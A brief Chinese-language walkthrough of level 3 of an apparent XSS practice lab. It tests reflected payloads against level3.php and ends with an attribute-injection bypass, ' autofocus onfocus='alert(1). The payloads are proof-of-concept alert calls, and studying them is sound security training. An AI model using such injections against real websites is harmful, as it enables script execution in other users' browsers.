# level3

level3.php?keyword=test&submit=搜索

依旧是一个搜索的界面，也是有两处显示

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603157696369-f7ec1943-b84d-4d5e-bc1b-927ab171bb6d.png)

level3.php?keyword="/><script>alert(1)</script>

经过测试，双引号闭合被处理了

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603157811945-ad1c7fd8-797c-4964-89fa-ba1f4b4efc32.png)

level3.php?keyword='/><script>alert(1)</script>

单引号闭合成功，但是输出结果的尖括号被编码

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603157919322-9e78b18d-430a-45e2-9e91-f23e59914f62.png)

level3.php?keyword=' autofocus onfocus='alert(1)

利用实践，添加input的事件，在获取焦点后执行js代码，然后加上一个自动获取焦点autofocus

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1603158849044-229e8c00-e502-422f-8019-28d91b342f50.png)